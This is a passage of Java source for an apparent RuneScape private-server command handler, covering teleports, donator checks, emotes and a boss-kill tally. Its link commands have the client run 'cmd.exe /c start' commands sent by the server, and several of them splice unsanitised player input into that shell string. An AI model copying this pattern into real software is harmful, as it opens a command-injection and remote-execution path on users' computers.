							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to Tzhaar caves, "+player.getDisplayName());
				return true;
				
				
				}
						
	

				if (cmd[0].equalsIgnoreCase("Miths")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1781,5342, 1));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to mithril dragons, "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("Frosts")) {
				
				if (player.getSkills().getLevel(Skills.DUNGEONEERING) < 85) {
						  player.getPackets()
						  .sendGameMessage( "You need an Dungeoneering level of 85 get here.",  true);
						   
				return false;
			}
			
			else{
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1314,4525, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to mithril dragons, "+player.getDisplayName());
				return true;
				
				
				}
				}
				if (cmd[0].equalsIgnoreCase("wyvern")) {
				
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1313,4493, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to Skeletal Wyverrns, "+player.getDisplayName());
				return true;
				
				
				}
				if (cmd[0].equalsIgnoreCase("donatorboss")) {
				
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				
				 
				}
                        
				 Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2187,3309, 0));                                        
                     
				
								}
				if (cmd[0].equalsIgnoreCase("donatordung")|| cmd[0].equalsIgnoreCase("ddung")|| cmd[0].equalsIgnoreCase("donordung")|| cmd[0].equalsIgnoreCase("donardung")) {//how ever dafuq you wana spell it.
				
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2893,5911, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to donator dung, "+player.getDisplayName());
				return true;
				
				
				
				}

				
				
				if (cmd[0].equalsIgnoreCase("locust")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3427,2800, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to locusts, "+player.getDisplayName());
				return true;
				
				
				}
				
	
				
			
	
				

							
							
							

				
				if (cmd[0].equalsIgnoreCase("hardestbossnz")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2925,5295, 1));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Goodluck.");
				return true;
				
				
				} 
				
				
				
				 if (cmd[0].equalsIgnoreCase("Brimhaven")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2712,9484, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to Brimhaven Dungeon, "+player.getDisplayName());
				return true;
				
				
				}
				if (cmd[0].equalsIgnoreCase("controla")) {
                    player.getPackets().sendGameMessage(String.valueOf(player.getControlerManager().getControler()));
				}
				
			
				
			if (cmd[0].equalsIgnoreCase("wguild")) {
			Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2869,3542, 0));                                        
                    
			player.getControlerManager().startControler("WGuildControler");
					}
					
		
		
			if (cmd[0].equalsIgnoreCase("Seat")){
					if(cmd[1] == null){
						//do nothing.
					}if(Integer.valueOf(cmd[1]) == 1){
						player.setNextWorldTile(new WorldTile(3090, 3495, 0));
						player.setNextFaceWorldTile(new WorldTile(3091, 3495, 0));
					}if(Integer.valueOf(cmd[1]) == 2){
						player.setNextWorldTile(new WorldTile(3090, 3496, 0));
						player.setNextFaceWorldTile(new WorldTile(3091, 3496, 0));
					}if(Integer.valueOf(cmd[1]) == 4){
						player.setNextWorldTile(new WorldTile(3082, 3492, 0));
						player.setNextFaceWorldTile(new WorldTile(3081, 3492, 0));
					}if(Integer.valueOf(cmd[1]) == 5){
						player.setNextWorldTile(new WorldTile(3082, 3493, 0));
						player.setNextFaceWorldTile(new WorldTile(3081, 3493, 0));
					}if(Integer.valueOf(cmd[1]) == 6){
						player.setNextWorldTile(new WorldTile(3082, 3494, 0));
						player.setNextFaceWorldTile(new WorldTile(3081, 3494, 0));
					}if(Integer.valueOf(cmd[1]) == 3){
						player.setNextWorldTile(new WorldTile(3082, 3491, 0));
						player.setNextFaceWorldTile(new WorldTile(3081, 3491, 0));
					}
				}
			if (cmd[0].equalsIgnoreCase("rest")) {
					
			
				 if (player.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot use that here! Go home.");
						return true;
					}
					else {
					player.getPackets().sendGameMessage("To change pose do ;;rest");
					player.getControlerManager().startControler("Rest");
					}
			}
			
			if (cmd[0].equalsIgnoreCase("StartPvp")) {
			
				if (player.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot use that here! Go home.");
						return true;
					}
				else {
					 player.setNextForceTalk(new ForceTalk("-PvP Enabled-"));
					 player.setNextGraphics(new Graphics(293));
						player.setNextAnimation(new Animation(3114));
						player.getPackets().sendGameMessage(
										"<col=FFFFFF>You are now in PvP. Be Careful");
						player.getPackets().sendGameMessage(
										"<col=FFFFFF>Pvp Boundry is anywhere outside the center strip of edge");
					player.getControlerManager().startControler("PvP");
					}

			}

			
				 if (cmd[0].equalsIgnoreCase("thezone")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1889,5126, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to my test are, Be here at own risk. if you die or lose items do not complain. even if you get bugged out dont complain. This is basicaly a NUKE ZONE!@!@!@!");
				return true;
				
				}
				
				 if (cmd[0].equalsIgnoreCase("Construction")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2637,3297, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Construction isnt finished, Currently in Beta-Testing. ");
				return true;
				
				}
				
				 if (cmd[0].equalsIgnoreCase("dks")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2912,4450, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to Dagannoth Kings. careful of the prime. ");
				return true;
				
				}
				
				 if (cmd[0].equalsIgnoreCase("barrows")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3565,3299, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to the barrows brothers ");
				return true;
				
				}
				
				 if (cmd[0].equalsIgnoreCase("dragons")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2895,9796, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to Dragons. ");
				return true;
				
				}

				if (cmd[0].equalsIgnoreCase("TrollQ")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2323,4593, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to The Sea Troll Queen. ");
				return true;
				
				}
				
			  if (cmd[0].equalsIgnoreCase("testx")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2654,4712, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to my test are, Be here at own risk. if you die or lose items do not complain. even if you get bugged out dont complain. This is basicaly a NUKE ZONE!@!@!@!");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test1")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1901,5353, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to my test are, Be here at own risk. if you die or lose items do not complain. even if you get bugged out dont complain. This is basicaly a NUKE ZONE!@!@!@!");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test2")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2832,3860, 3));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to my test are, Be here at own risk. if you die or lose items do not complain. even if you get bugged out dont complain. This is basicaly a NUKE ZONE!@!@!@!");
				return true;
				
				}
				
			
				
				if (cmd[0].equalsIgnoreCase("test4")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2599,3157, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to my test are, Be here at own risk. if you die or lose items do not complain. even if you get bugged out dont complain. This is basicaly a NUKE ZONE!@!@!@!");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test5")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3279,5836, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to the avatar Arena Goodluck.");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test6")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2735,9980, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to slayer dungeon test.");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test7")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2918,9895, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to hero guild.");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test8")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2931,10083, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to hero guild.");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test9")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2656,10071, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to hero guild.");
				return true;
				
				}
				
				if (cmd[0].equalsIgnoreCase("test10")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2521,10021, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000> Welcome to hero guild.");
				return true;
				
				}
				
				
				if (cmd[0].equalsIgnoreCase("test12")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2643,9763, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to the new arena, "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test13")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2599,9561, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to the new arena, "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test14")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2588,9490, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to the jail, "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test15")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2574,9446, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome , "+player.getDisplayName());
				return true;
				
				
				}
				
				
				if (cmd[0].equalsIgnoreCase("test16")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2506,9462, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome , "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test17")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2341,9384, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome , "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test18")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2442,9436, 2));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Let the games begin "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test19")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2521,9323, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome , "+player.getDisplayName());
				return true;
				
				
				}
				
				if (cmd[0].equalsIgnoreCase("test20")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3087,3491, 0));                                        
                            player.getControlerManager().startControler("Funpk");
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome , "+player.getDisplayName());
				return true;
				
				
				}
		
				
		
			
				if (cmd[0].equalsIgnoreCase("wildrevs")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3105, 3930, 0));
							 player.getPackets().sendGameMessage(
                                    "<col=DC0000>This is Revanants, your in Level 50 Multi Wilderness, Run to Safety! ");
							player.getPackets().sendGameMessage(
                                    "<col=DC0000>You come here at your own risk. Any items you lose is your own fault and wont be refunded.");
				return true;
			}
			 if (cmd[0].equalsIgnoreCase("revs")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3081, 10058, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000>Welcome to rev caves ");
							player.getPackets().sendGameMessage(
                                    "<col=DC0000>You come here at your own risk. Any items you lose is your own fault and wont be refunded.");
				return true;
				
				}
					if (cmd[0].equals("buff")) {
				
				
					player.setNextForceTalk(new ForceTalk("Get Buff!"));
					player.setNextAnimation(new Animation(2762));
					player.addStopDelay(6);
				}	
				
			
	
	

	if (cmd[0].equals("party")) {
					player.setNextForceTalk(new ForceTalk("Partytime"));
					player.setNextAnimation(new Animation(7071));
					player.addStopDelay(2);
				}
 


	 

	if (cmd[0].equals("facefloor")) {
					player.setNextForceTalk(new ForceTalk("-Facefloor-"));
					player.setNextAnimation(new Animation(761));
					player.addStopDelay(2);
				}
 
	
//Custom emotes
			
			
				if (cmd[0].equals("stars")) {
					player.setNextForceTalk(new ForceTalk("Jump to it! "));
					player.setNextAnimation(new Animation(2761));
					player.addStopDelay(6); 
				}
	
				if (cmd[0].equals("situp")) {
					player.setNextForceTalk(new ForceTalk("Push it to the Extreme!"));
					player.setNextAnimation(new Animation(2763));
					player.addStopDelay(6);
				}
	
				if (cmd[0].equals("runit")) { 
					player.setNextForceTalk(new ForceTalk("Speed like a car! move like a rock!"));
					player.setNextAnimation(new Animation(2764));
					player.addStopDelay(6);
				}
					
							
					
				if (cmd[0].equals("bow")) {
					player.setNextForceTalk(new ForceTalk("All hail !"));
					player.setNextAnimation(new Animation(858));
				}

			//new ish	
				if (cmd[0].equals("shank")) {
					player.setNextAnimation(new Animation(70399));
					player.addStopDelay(6);
				}
				
				if (cmd[0].equals("feel")) {
					player.setNextAnimation(new Animation(70397));
					player.addStopDelay(6);
				}
				
				if (cmd[0].equals("harlemshake")) {
					player.setNextAnimation(new Animation(7006));
					player.addStopDelay(6);
				}
				
				if (cmd[0].equalsIgnoreCase("barrelchest")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(1796,4408, 3));                                        
                            
							player.getPackets().sendGameMessage(
                                    "<col=00ff00>Prepare to fight!, "+player.getDisplayName());
				return true;
				}
				
			
			
			
				
				if (cmd[0].equalsIgnoreCase("cash")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2661,3304, 0));                                        
                            
							player.getPackets().sendGameMessage(
                                    "Welcome cash thieve stalls to get money! "+player.getDisplayName());
				return true;
				}
				
			
				
				if (cmd[0].equals("blar")) {
					player.setNextAnimation(new Animation(70373));
					player.addStopDelay(3);
				}

				if (cmd[0].equals("unemote")) {
				if (player.getControlerManager().getControler() != null) {
						player.getPackets().sendGameMessage("You cannot use that here! Go home.");
						return true;
					}
				else {
					player.setNextAnimation(new Animation(-1));
					player.addStopDelay(3);
				}
			}
			

//Custom emotes end		


	
						if (cmd[0].equalsIgnoreCase("ruins")) {
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2815, 5511, 0));
				player.getPackets().sendGameMessage(
                                    "<col=DC0000>If you dont teleport past the barrier, Teleport again to pk.");
				return true;
			
			
		    }
			
			if (cmd[0].equalsIgnoreCase("runecraft")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2464,4818, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to Runecrafting, "+player.getDisplayName());
                                    
				return true;
		    }
			   
			
			if (cmd[0].equalsIgnoreCase("donatorzone2") || cmd[0].equals("dz2")) {
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3041,	4531, 0));
									player.getPackets().sendGameMessage(
                                    "<col=00ff00>Thanks for supporting The Poanizer Project, "+player.getDisplayName());
				return true;
				
			   
		    }	
		
		
			   if (cmd[0].equalsIgnoreCase("oldd")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(5889, 4706, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to the old home, nothing special");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("questt")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2738, 5726, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000000>I guess you know some commands that arnt displayed, "+player.getDisplayName());
				return true;
		    }
                    if (cmd[0].equalsIgnoreCase("train2")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2870,9852, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=00ff00>Welcome to higher level training, "+player.getDisplayName());
				return true;
	}
			
			 
			   if (cmd[0].equalsIgnoreCase("corp")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2966,4383, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to Corporal beast! Good luck!<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("duel")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3366,3276, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=DC0000><img=1>Welcome to the Duel Arena record your stakes.<img=1> ");
							player.getPackets().sendGameMessage(
                                    "<col=DC0000><img=1>There are Bugs that can make you lose items in a stake, so do stakes at own risk.<img=1> ");
							 player.getPackets().sendGameMessage(
                                    "<col=DC0000><img=1>In other words Have fun losing bank.<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("jad")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2440,5174, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to Tzhaar city, Jad is through the cave!<img=1> ");
				return true;
		    }
			
				
			
			
			 if (cmd[0].equalsIgnoreCase("polypore")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3297,9824, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to the polypore dungeon!<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("jadinko")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3011,9275, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to the jadinko lair!<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("kq")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3507,9493, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to the Kalphite queen lair!<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("bork")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3114,5528, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to the Bork! (PVP)<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("nomad")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3360,5845, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to Nomad! Good luck!<img=1> ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("multi")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3240,3611, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1>Welcome to Multi PVP area! ");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("pvp")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3081,3523, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1> Welcome to PVP!");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("easts")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3360,3658, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1> Welcome to Easts PVP!");
				return true;
			
		    }
			
			 if (cmd[0].equalsIgnoreCase("wests")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2984,3596, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1> Welcome to Wests PVP!");
				return true;
			
				
		    }
			   if (cmd[0].equalsIgnoreCase("castlewars")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2442,3090, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=1> Welcome to CastleWars!");
				return true;
		    }
			   if (cmd[0].equalsIgnoreCase("dung")) {
                   Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3449,3745, 0));             
				return true;
		    }
			if (cmd[0].equalsIgnoreCase("train")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2323, 3794, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=4>Welcome to Training!");		
			}			
			if (cmd[0].equalsIgnoreCase("jungle")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2439, 2890, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=4>Beware of Jungle Strykewyrms!");		
			}
			if (cmd[0].equalsIgnoreCase("desert")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3345, 3163, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=4>Beware of Desert Strykewyrms!");		
			}
			if (cmd[0].equalsIgnoreCase("ice")) {
                    Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3432, 5653, 0));                                        
                            player.getPackets().sendGameMessage(
                                    "<col=000079><img=4>Beware of Ice Strykewyrms!");		
			}
			
		
			if (cmd[0].equalsIgnoreCase("vote")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.VOTE_LINK);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("youtube")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.YOUTUBE_LINK);
				return true;
			}

		if (cmd[0].equalsIgnoreCase("client")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.CLIENT);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("forum")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.FORUM);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("highscores")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.HIGHSCORES_LINK);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("updates")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.UPDATES);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("rules")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.RULES);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("donate")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.DONATE_LINK);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.DONATE2_LINK);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("adv")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.ADV1);
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.ADV2);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("topic")) {
				player.getPackets().sendExecMessage("cmd.exe /c start http://www.poanizer.com/project/index.php?topic=" + cmd[1]);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("itemdb")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.ITEMDB_LINK);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("npcdb")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.NPCDB_LINK);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("objectdb")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.OBJECTDB_LINK);
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("itemsearch")) {
				player.getPackets().sendExecMessage("cmd.exe /c start http://www.runelocus.com/tools/rs-item-id-list/?search=" + cmd[1].replace("-", "+") + "&order_by=itemlist_id");
				return true;
			}
				
			if (cmd[0].equalsIgnoreCase("npcsearch")) {
				player.getPackets().sendExecMessage("cmd.exe /c start http://www.runelocus.com/tools/rs-npc-id-list/?search="+ cmd[1].replace("-", "+") + "&order_by=npclist_id");
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("obejectsearch")) {
				player.getPackets().sendExecMessage("cmd.exe /c start http://www.runelocus.com/tools/rs-object-id-list/?search=" +cmd[1].replace("-", "+") + "&order_by=objectlist_id");
				return true;
			}
			
			
			
			
			if (cmd[0].equalsIgnoreCase("website")) {
				player.getPackets().sendExecMessage("cmd.exe /c start " + Settings.WEBSITE_LINK);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("xpoff")) {
				player.getPackets().sendGameMessage("XP off.");
				player.xpLock = true;
				return true;
			}
			if (cmd[0].equalsIgnoreCase("xpon")) {
				player.getPackets().sendGameMessage("XP on.");
				player.xpLock = false;
				return true;
			}
			if (cmd[0].equalsIgnoreCase("lockxp")) {
				player.getPackets().sendGameMessage("Locked xp.");
				player.xpLock = true;
				return true;
			}
			if (cmd[0].equalsIgnoreCase("unlockxp")) {
				player.getPackets().sendGameMessage("Unlocked xp.");
				player.xpLock = false;
				return true;
			}
			
			

   if (cmd[0].equalsIgnoreCase("startcw")) {
  CastleWars.startGame();		
   }
		
		
		
	if (cmd[0].equalsIgnoreCase("pvmscore") || cmd[0].equalsIgnoreCase("pvmkills")){
		player.getInterfaceManager().sendInterface(275);
		for (int i = 0; i < 316; i++){
		player.getPackets().sendIComponentText(275, i, " ");
		}
		
		int total = (player.BandosKills + player.ZamyKills + player.SaraKills + player.ArmaKills + 
		player.KiwiKills + player.CorpKills + player.NexKills + player.GlacorKills + 
		player.KBDKills + player.TDKills + player.AhrimKills + player.DHKills + player.GuthanKills 
		+ player.KarilKills + player.VeracKills + player.ToragKills + player.GanoKills + 
		player.SupremeKills + player.PrimeKills + player.RexKills + player.DestructionKills + 
		player.NomadKills + player.RevKills + player.QBDKills);
		

		
		
		player.getPackets().sendIComponentText(275, 2, "Your PvM Kills");
		player.getPackets().sendIComponentText(275, 14, " By Poanizer.");
		
		player.getPackets().sendIComponentText(275, 17, "<col=FF0000>Total Bosses Killed - </col><col=0000F>" + total + "</col>");
		
		
		player.getPackets().sendIComponentText(275, 18, "Bandos - " +player.BandosKills +" Kills");
		player.getPackets().sendIComponentText(275, 19, "Zamorak - " +player.ZamyKills +" Kills");
		player.getPackets().sendIComponentText(275, 20, "Saradomin - " +player.SaraKills +" Kills");
		player.getPackets().sendIComponentText(275, 21, "Armadyl - " +player.ArmaKills +" Kills");
	
		player.getPackets().sendIComponentText(275, 23, "Corporeal Beast - " +player.CorpKills +" Kills");
		player.getPackets().sendIComponentText(275, 24, "Nex - " +player.NexKills +" Kills");
		player.getPackets().sendIComponentText(275, 25, "Glacors - " +player.GlacorKills +" Kills");
		player.getPackets().sendIComponentText(275, 26, "Nomad - " +player.NomadKills +" Kills");
		player.getPackets().sendIComponentText(275, 27, "King Black Dragon - " +player.KBDKills +" Kills");
		player.getPackets().sendIComponentText(275, 28, "Tormented Demon - " +player.TDKills +" Kills");
		player.getPackets().sendIComponentText(275, 29, "Ganodermic Beasts - " +player.GanoKills +" Kills");
		player.getPackets().sendIComponentText(275, 30, "Avatar of Destruction - " +player.DestructionKills +" Kills");
		player.getPackets().sendIComponentText(275, 31, "Steel kiwi - " +player.KiwiKills +" Kills");
		player.getPackets().sendIComponentText(275, 32, "Queen Black Dragon - " +player.QBDKills +" Kills");
		
		player.getPackets().sendIComponentText(275, 34, "Ahrim - " +player.AhrimKills +" Kills");
		player.getPackets().sendIComponentText(275, 35, "Dharok - " +player.DHKills +" Kills");
		player.getPackets().sendIComponentText(275, 36, "Guthans - " +player.GuthanKills +" Kills");
		player.getPackets().sendIComponentText(275, 37, "Karil - " +player.KarilKills +" Kills");
		player.getPackets().sendIComponentText(275, 38, "Torag - " +player.ToragKills +" Kills");
		player.getPackets().sendIComponentText(275, 39, "Verac - " +player.VeracKills +" Kills");
		
		player.getPackets().sendIComponentText(275, 41, "Dagannoth Supreme - " +player.SupremeKills +" Kills");
		player.getPackets().sendIComponentText(275, 42, "Dagannoth Prime - " +player.PrimeKills +" Kills");
		player.getPackets().sendIComponentText(275, 43, "Dagannoth Rex - " +player.RexKills +" Kills");
	
	
		player.getPackets().sendIComponentText(275, 45, "Revenants - " +player.RevKills +" Kills");
		
		
		player.getPackets().sendIComponentText(275, 47, "Poanizer - " +player.Po1Kills +" Kills");
